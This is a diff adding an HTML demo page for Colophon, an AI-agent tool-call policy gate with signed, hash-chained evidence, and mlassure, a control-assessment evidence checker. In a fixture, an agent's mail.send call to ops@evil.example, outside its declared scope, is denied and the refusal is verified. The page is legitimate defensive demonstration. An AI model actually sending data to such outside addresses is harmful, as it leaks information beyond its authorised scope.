@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="dark"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'"><title>Colophon + mlassure · Evidence someone else can check</title><style>*{box-sizing:border-box}html{scroll-behavior:smooth;scroll-padding-top:5rem}body{margin:0;background:#101a22;color:#edf4f3;font:17px/1.6 system-ui,sans-serif}header,main,footer{max-width:850px;margin:auto;padding:1.25rem}header{padding-top:2.5rem}h1{font-size:clamp(2rem,6vw,3.6rem);line-height:1.07;letter-spacing:-.04em;margin:.7rem 0}h2{font-size:clamp(1.45rem,4vw,2.1rem);line-height:1.25}h3{font-size:1rem;color:#8ee1c5;margin-bottom:0}p{color:#cbd8df}.eyebrow{color:#8ee1c5;font-size:.78rem;font-weight:750;letter-spacing:.09em;text-transform:uppercase}nav{position:sticky;top:0;background:#101a22f5;z-index:1;border-block:1px solid #344651;display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:.1rem;padding:.4rem;max-width:850px;margin:auto}a{color:#8ee1c5;text-underline-offset:4px}nav a{padding:.65rem .15rem;font-size:.85rem;text-decoration:none;text-align:center}section{border:1px solid #344651;border-radius:18px;padding:clamp(1rem,4vw,2rem);margin:1.2rem 0 2rem;background:#172630;scroll-margin-top:1rem}details{border-top:1px solid #3b4e59;padding:.65rem 0}summary{cursor:pointer;min-height:44px;display:list-item;padding:.5rem 0;font-size:.95rem;font-weight:650}pre{background:#0b141b;color:#d9e8ed;padding:1rem;border-radius:8px;font:12px/1.6 ui-monospace,monospace;white-space:pre-wrap;overflow-wrap:anywhere;tab-size:2}a:focus-visible,summary:focus-visible{outline:3px solid #ffc879;outline-offset:3px}.next{display:inline-block;padding:.8rem 0;margin-top:.6rem}.note{border-left:3px solid #ffc879;padding-left:1rem;font-size:.9rem}.claim{border-top:1px solid #344651}.claim p{margin-top:.3rem}footer{font-size:.85rem;overflow-wrap:anywhere}@media(max-width:380px){nav a{padding:.6rem .1rem;font-size:.75rem}}@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}@media print{nav,.next{display:none}body,section{background:white;color:black}p,pre,h3,.eyebrow{color:black}section{break-inside:avoid}}</style></head><body>
+<header><span class="eyebrow">[un]prompted · Colophon + mlassure</span><h1>Evidence someone else can check.</h1><p><strong>15 seconds:</strong> An agent tries to mail outside its declared scope. The gate refuses it. A signed packet lets someone else check the refusal’s recorded evidence. mlassure applies the same discipline to control assessments.</p><p class="note"><strong>Two minutes:</strong> follow the five screens; tap a detail to inspect source or output. Fully offline. All verification below is recorded from generation, not run by this page.</p></header>
+<nav aria-label="Demo screens"><a href="#s1">1 Boundary</a><a href="#s2">2 Evidence</a><a href="#s3">3 Verify</a><a href="#s4">4 mlassure</a><a href="#s5">5 Limits</a></nav><main><section id="s1" aria-labelledby="h1"><span class="eyebrow">01 / 05 · The boundary</span><h2 id="h1">Authorized: *@acme.example. Attempted: ops@evil.example. Denied.</h2><p>The notifier fixture calls mail.send through Colophon’s reference MCP gate. OPA evaluates gate.rego against the signed Record; this call is refused before the demo upstream executes it. No real email is sent.</p><details><summary>Declaration · exact fixture</summary><pre># notifier: writes a notice file inside its sandbox and mails it to the team.
+# Medium risk. Bounded to *@acme.example and out/notifier/.
+id: 9b2d1c4e-5f6a-4b7c-8d9e-0f1a2b3c4d5e
+name: notifier
+owner: platform-ops@acme.example
+risk_tier: medium
+autonomy_level: L3
+tools:
+  - name: fs.write
+    data_access: write
+    data_classes: [internal]
+  - name: mail.send
+    data_access: none
+    data_classes: []
+    destinations: [&quot;*@acme.example&quot;]
+data_classes: [internal]
+sandbox:
+  write_paths: [&quot;out/notifier/&quot;]
+max_scopes: []
+kill_switch:
+  available: true
+  mechanism: &quot;disable the notifier service account&quot;
+review_due: &quot;2027-03-31&quot;
+control_mappings:
+  - { control_id: &quot;LLM06&quot;, framework: OWASP-LLM-TOP10 }
+  - { control_id: &quot;MANAGE-2.2&quot;, framework: NIST-AI-RMF }
+</pre></details><details><summary>Rego · exact destination rule excerpt</summary><pre>denies contains {&quot;rule_id&quot;: &quot;COL-GATE-DESTINATION&quot;, &quot;reason&quot;: {&quot;field&quot;: &quot;tools[].destinations&quot;, &quot;value&quot;: dest}} if {
+	tool_known
+	count(object.get(tool, &quot;destinations&quot;, [])) &gt; 0
+	count(destination_keys) == 1
+	dest := destination_of(args)
+	not destination_allowed(dest)
+}
+</pre></details><details><summary>Enforcement scope</summary><pre>This is the reference Rego gate. Foreign PEPs such as AgentCore Gateway + Dogwood enforce their own policies; Colophon normalizes and seals their decisions. LOG_ONLY records a would-be verdict and does not establish that a call was blocked. This build uses repository fixtures, not a fresh AWS session.</pre></details><a class="next" href="#s2">Next →</a></section><section id="s2" aria-labelledby="h2"><span class="eyebrow">02 / 05 · The evidence</span><h2 id="h2">A refusal carries its rule, its bound inputs, and a link to the previous decision.</h2><p>record_sha256 binds the decision to the Record’s canonical_sha256. policy_sha256 binds it to the gate.rego bytes. prev_sha256 equals the previous decision’s this_sha256. this_sha256 hashes this decision (excluding itself). The signed bundle also covers the trace head’s line count and final hash, so truncation is detectable.</p><details><summary>Actual decision · full fields and hashes</summary><pre>{
+  &quot;source&quot;: &quot;colophon-gate&quot;,
+  &quot;effect&quot;: &quot;deny&quot;,
+  &quot;rule_ids&quot;: [
+    &quot;COL-GATE-DESTINATION&quot;
+  ],
+  &quot;reasons&quot;: [
+    {
+      &quot;field&quot;: &quot;tools[].destinations&quot;,
+      &quot;value&quot;: &quot;ops@evil.example&quot;
+    }
+  ],
+  &quot;tool&quot;: &quot;mail.send&quot;,
+  &quot;args_sha256&quot;: &quot;661b1ada64eb581e80095f9150a08dd2c1dfe13010b0a2081dee9b387a4786e4&quot;,
+  &quot;args_redacted&quot;: {
+    &quot;to&quot;: &quot;ops@evil.example&quot;,
+    &quot;subject&quot;: &quot;Weekly notice&quot;,
+    &quot;body&quot;: &quot;See attached&quot;
+  },
+  &quot;session_id&quot;: &quot;notifier-session-20261027155048&quot;,
+  &quot;call_index&quot;: 2,
+  &quot;record_sha256&quot;: &quot;fc34215f66130625c3b6915ea7bd6a2458f897d3c886305d34d2359406141642&quot;,
+  &quot;policy_sha256&quot;: &quot;15980e1f0d247bba504001fc0fb521e5b76d994811a8e5ef6994030eb4896acf&quot;,
+  &quot;ts&quot;: &quot;2026-10-27T15:50:49.097Z&quot;,
+  &quot;prev_sha256&quot;: &quot;5cd34b4e3f0db1a0d7324704e6644bb79710a2aa24d83ba9bf596e04e2d599c0&quot;,
+  &quot;this_sha256&quot;: &quot;23ac7a93521260d34ed187eac38e7177e790bfa4773902e30b854b375ecb8132&quot;
+}</pre></details><details><summary>Actual trace head</summary><pre>{
+  &quot;trace_head_version&quot;: &quot;0.1.0&quot;,
+  &quot;lines&quot;: 3,
+  &quot;last_sha256&quot;: &quot;23ac7a93521260d34ed187eac38e7177e790bfa4773902e30b854b375ecb8132&quot;,
+  &quot;sealed_at&quot;: &quot;2026-10-27T15:50:49.098Z&quot;
+}
+</pre></details><details><summary>Chain limits</summary><pre>The chain commits to recorded order. It does not independently establish real-world timing or prove that every action was recorded. Before sealing, the chain is not signed; a writer could rebuild it. The signature anchors the sealed packet to a key.</pre></details><a class="next" href="#s3">Next →</a></section><section id="s3" aria-labelledby="h3"><span class="eyebrow">03 / 05 · The verification</span><h2 id="h3">The original passes. An edited trace fails. The unchanged manifest still has a valid signature.</h2><p>Cosign checks manifest.json. Colophon also checks the listed files, Record signature, policy binding, OSCAL evidence links, and trace chain. The altered copy replaces ops@evil.example with ops@acme.example in the trace without re-signing.</p><details><summary>Actual notifier bundle · complete file list</summary><pre>catalog/controls.yaml
+evidence/042d79faf4cef9cc713f594af04619d5c22f78d07494f0b7e40a663a7dad4f58.json
+evidence/652976121a6acec4804e0aecc987ade8101d82865aeb9551475a58bd36915fe5.json
+evidence/65719e59f989226ea8bb87a974a9cd09b8e1dc239cc9908e3a4e42aec1b17ac1.json
+evidence/662570f2c5be48207326a93b9a4531dfaebdf20c3c72e0e5268e34821207bb77.json
+evidence/9396f68e8b0506c492110ddc4801e60ef60f16e846ec92c01600ee9c03a4a3ec.json
+evidence/9726e00f23f722b42413d40838dfe21f7846c35be0133d68764952987397d527.json
+evidence/bf08ca47bd680cc87e75fd41a912580f646e733e40c936df2792602e5782800b.json
+evidence/cb5659923c1b9be9426e59d9d122fa753247043607a04b88979246437d212dd4.json
+evidence/f4a9416d756a46b80b51868432842c87ba2b92db6fb8c3c72aa0a8d6018872cb.json
+manifest.json
+manifest.sigstore.json
+policy/gate.rego
+records/notifier.record.json
+records/notifier.record.sigstore.json
+report/assessment-results.json
+report/narrative.md
+session.json
+trace/notifier-session-20261027155048.jsonl
+trace/notifier-session-20261027155048.jsonl.head.json</pre></details><details><summary>Cosign · exit 0</summary><pre>WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.
+Verified OK</pre></details><details><summary>Colophon · exit 0</summary><pre>manifest: ok (18 files)
+signature: ok (manifest.sigstore.json verifies over manifest.json with $RUN/demo/keys/cosign.pub)
+oscal: schema ok; rlinks: 6 resolved, unresolved: 0
+record: notifier.record.json ok (hashes recompute, signature verifies)
+trace: notifier-session-20261027155048.jsonl ok (3 decisions, chain intact, head commitment matches, bound to verified record)
+policy: notifier-session-20261027155048.jsonl: 3 decisions bound to policy/gate.rego (sha256 15980e1f0d24…)
+verified: $RUN/demo/notifier/bundle</pre></details><details><summary>Tampered copy · Colophon exit 1</summary><pre>signature: ok (manifest.sigstore.json verifies over manifest.json with $RUN/demo/keys/cosign.pub)
+oscal: schema ok; rlinks: 6 resolved, unresolved: 0
+record: notifier.record.json ok (hashes recompute, signature verifies)
+policy: notifier-session-20261027155048.jsonl: 3 decisions bound to policy/gate.rego (sha256 15980e1f0d24…)
+FAIL manifest: trace/notifier-session-20261027155048.jsonl: sha256 mismatch: manifest 9dd76b889aec413c8eac4b92b3a887fb2430958bb208435933107d015bb3f2a3, file 351f3344ea613a84eb7233607188322f3f33e27006ebe2ca875a3f7f6b0d124d
+FAIL trace: notifier-session-20261027155048.jsonl: line 3: this_sha256 mismatch: recorded 23ac7a93521260d34ed187eac38e7177e790bfa4773902e30b854b375ecb8132, computed b25a69dc49e3d59408b6dbcf8ca181d418f22a19b45e55dbded4445449052d71
+NOT VERIFIED: $RUN/tampered (2 failures)</pre></details><details><summary>Tampered copy · Cosign still exits 0</summary><pre>WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.
+Verified OK</pre></details><details><summary>Trust boundary</summary><pre>The local demo uses a disposable key and no transparency-log entry, hence --insecure-ignore-tlog. A recipient must obtain a trusted public key independently; accepting a key supplied by an unknown producer proves no trusted identity. The HTML is a rendering, not a signed packet.</pre></details><a class="next" href="#s4">Next →</a></section><section id="s4" aria-labelledby="h4"><span class="eyebrow">04 / 05 · The complementary project</span><h2 id="h4">mlassure asks whether collected evidence supports a control assessment.</h2><p>Deterministic collectors retrieve fixture evidence into an EvidenceStore. Control pattern tags select code checks, LLM judgment, or human-attestation handling. The citation guard rejects IDs absent from the current store; satisfied and partially-satisfied verdicts must cite evidence. Existing citations establish traceability, not relevance or sound reasoning. The live AWS provider is deferred in this revision.</p><details><summary>Recorded assessment · exact conformance-fixture judgment, not a fresh LLM run</summary><pre>{
+  &quot;controlId&quot;: &quot;SI-6(1)&quot;,
+  &quot;status&quot;: &quot;satisfied&quot;,
+  &quot;confidence&quot;: &quot;high&quot;,
+  &quot;rationale&quot;: &quot;Data capture is enabled at 100 percent and an hourly model-quality monitoring schedule is Scheduled against the InService endpoint.&quot;,
+  &quot;evidenceCited&quot;: [
+    &quot;00000000-0000-4000-8000-000000000001&quot;,
+    &quot;00000000-0000-4000-8000-000000000002&quot;
+  ],
+  &quot;gaps&quot;: []
+}</pre></details><details><summary>Control examples from fixtures/controls/nist-subset.yaml</summary><pre>SC-28: deterministic encryption-at-rest check; no LLM call.
+SI-6(1): synthesis of monitoring evidence; LLM judgment.
+SA-10: human review; returns insufficient-evidence without an LLM call.</pre></details><details><summary>Fresh check during generation · citation-guard tests</summary><pre>bun test v1.4.0 (34cbb9a40)
+
+src/guard/citation-guard.test.ts:
+(pass) validateCitations &gt; passes when all cited IDs are in the store [0.61ms]
+(pass) validateCitations &gt; passes when evidenceCited is empty [0.10ms]
+(pass) validateCitations &gt; M8c: satisfied or partially-satisfied with nothing cited is refused by name [0.31ms]
+(pass) validateCitations &gt; M8c: not-satisfied, not-applicable and insufficient-evidence may cite nothing [0.06ms]
+(pass) validateCitations &gt; M8c: a phantom id is still a CitationError, checked before the uncited rule [0.07ms]
+(pass) validateCitations &gt; throws CitationError when an ID is not in the store [0.04ms]
+(pass) validateCitations &gt; CitationError message includes the invalid ID [0.04ms]
+(pass) validateCitations &gt; throws on the first invalid ID it encounters [0.04ms]
+
+ 8 pass
+ 0 fail
+ 18 expect() calls
+Ran 8 tests across 1 file. [35.00ms]</pre></details><details><summary>Fresh check during generation · positive fixture, exit 0</summary><pre>$ bun run src/cli/index.ts verify-bundle &quot;fixtures/bundles/positive/fraud-detection-v2-clean&quot;
+verify-bundle: OK — 6 files verified, root df71e1e04d32a11b7c1c0dc6db6e8139310672c96b350c961de37f9d2e754b59
+  Scope: integrity + completeness only. Authenticity requires the signature:
+    cosign verify-blob --key cosign.pub --bundle &lt;manifest.sig.bundle&gt; /workspace/mlassure/fixtures/bundles/positive/fraud-detection-v2-clean/manifest.json
+  (no signature artifacts found in this bundle)</pre></details><details><summary>Fresh check during generation · tampered fixture, exit 1</summary><pre>$ bun run src/cli/index.ts verify-bundle fixtures/bundles/negative/tampered-file
+verify-bundle: FAILED — 1 violation(s):
+  ✗ hash mismatch: report.json — manifest 64b49b97b99be765746d3e34fccfcba48727265f2af433d41be3657d624979ee, on disk e8776860e3afecec922689c12b0ebfd6e68e7c80c9f9888ff1f214bfcae29fbb
+error: script &quot;dev&quot; exited with code 1</pre></details><details><summary>Independent bundle verification</summary><pre>mlassure bundles report.json, evidence/&lt;uuid&gt;.json (all retrieved payloads, cited or not), optional oscal.json and narrative.md, and manifest.json. verify-bundle checks integrity and completeness. Authenticity needs a separate Cosign check over the manifest. These checked-in conformance fixtures are unsigned; no fresh LLM assessment or mlassure signature verification is claimed. The projects are complementary; no automatic Colophon-to-mlassure integration is demonstrated.</pre></details><a class="next" href="#s5">Next →</a></section><section id="s5" aria-labelledby="h5"><span class="eyebrow">05 / 05 · What this proves</span><h2 id="h5">Evaluations tell us what happened. Verifiable evidence lets someone else check the claim.</h2><p>Keep four claims separate. A valid signature can accompany a mistaken assessment.</p><div class="claim"><h3>Evidence integrity</h3><p>Manifest hashes and signatures bind the supplied bytes to a key. They do not establish that the evidence is true, complete relative to the outside world, or produced by a trustworthy operator.</p></div><div class="claim"><h3>Policy enforcement</h3><p>This notifier run exercises the reference gate’s destination refusal. A sealed foreign verdict records what that PEP reported; enforcement depends on that PEP, its mode, and whether the action passed through it.</p></div><div class="claim"><h3>Control assessment</h3><p>A finding applies a particular check or judgment to available evidence. The citation invariant excludes nonexistent evidence IDs; it cannot establish that the evidence supports the conclusion.</p></div><div class="claim"><h3>Behavioral correctness</h3><p>Neither project proves the agent is correct, safe in every context, or unable to bypass an unobserved boundary. Those claims require additional evaluation and coverage evidence.</p></div><a class="next" href="#s1">Back to the boundary ↑</a></section></main>
+<footer><h2>Reproduce & inspect</h2><p>Generated 2026-10-27T15:50:58+00:00. Colophon source b1ecd7c929f28e35c997ea2ae3c5935712adc0a2; mlassure source dc956322020ed925cefd50081770ca72e9dd3bc6. Executed during generation, recorded when viewed. Paths shortened to $RUN; output otherwise preserved. Sessions, keys, timestamps and hashes vary on regeneration. Only synthetic fixture content is embedded.</p><details><summary>Regeneration and verification commands</summary><pre># Prerequisites: Python 3, Bun, OPA, Cosign 3.x (pins in .github/workflows/ci.yml).
+# Install only existing locked dependencies in both checkouts:
+(cd ../mlassure &amp;&amp; bun install --frozen-lockfile)
+bun install --frozen-lockfile
+python3 scripts/conference-demo.py --mlassure ../mlassure
+
+# Each run prints its own $RUN directory under ignored out/conference-*.
+# Substitute that path below. It contains a disposable private key: do not publish it.
+RUN=out/conference-REPLACE_WITH_PRINTED_RUN
+B=&quot;$RUN/demo/notifier/bundle&quot;
+cosign verify-blob --key &quot;$RUN/demo/keys/cosign.pub&quot; \
+  --bundle &quot;$B/manifest.sigstore.json&quot; --insecure-ignore-tlog &quot;$B/manifest.json&quot;
+bun packages/cli/main.ts bundle verify &quot;$B&quot; --pubkey &quot;$RUN/demo/keys/cosign.pub&quot;
+bun packages/cli/main.ts bundle verify &quot;$RUN/tampered&quot; --pubkey &quot;$RUN/demo/keys/cosign.pub&quot;
+# Last command must exit 1. The generator checks this and the named failure reasons.
+</pre></details><details><summary>Tool versions used</summary><pre>1.4.0
+Version: 1.19.1
+Build Commit: 54896f9f28515d14b31a93e6ef5737bb85866e30-dirty
+Build Timestamp: 2026-08-17T12:37:32Z
+Build Hostname:
+Go Version: go1.26.6
+Platform: linux/amd64
+Rego Version: v1
+WebAssembly: available
+______   ______        _______. __    _______ .__   __.
+ /      | /  __  \      /       ||  |  /  _____||  \ |  |
+|  ,----&#x27;|  |  |  |    |   (----`|  | |  |  __  |   \|  |
+|  |     |  |  |  |     \   \    |  | |  | |_ | |  . `  |
+|  `----.|  `--&#x27;  | .----)   |   |  | |  |__| | |  |\   |
+ \______| \______/  |_______/    |__|  \______| |__| \__|
+cosign: A tool for Container Signing, Verification and Storage in an OCI registry
+
+GitVersion:    v3.1.3
+GitCommit:     11926fa5bbbbde47e88fc006b625a17769b743b2
+GitTreeState:  clean
+BuildDate:     2026-08-05T23:43:27Z
+GoVersion:     go1.26.4
+Compiler:      gc
+Platform:      linux/amd64</pre></details><p>Source links require a network; all demo content above is embedded.</p><ul><li><a href="https://github.com/joseruiz1571/colophon/blob/b1ecd7c929f28e35c997ea2ae3c5935712adc0a2/docs/walkthrough.md">Colophon walkthrough</a></li><li><a href="https://github.com/joseruiz1571/colophon/blob/b1ecd7c929f28e35c997ea2ae3c5935712adc0a2/packages/policy/gate.rego">Reference policy</a></li><li><a href="https://github.com/joseruiz1571/mlassure/blob/dc956322020ed925cefd50081770ca72e9dd3bc6/SPEC.md">mlassure bundle spec</a></li><li><a href="https://github.com/joseruiz1571/mlassure/blob/dc956322020ed925cefd50081770ca72e9dd3bc6/fixtures/bundles/README.md">mlassure conformance vectors</a></li><li><a href="https://github.com/joseruiz1571/mlassure/blob/dc956322020ed925cefd50081770ca72e9dd3bc6/src/guard/citation-guard.ts">mlassure citation guard</a></li></ul></footer></body></html>
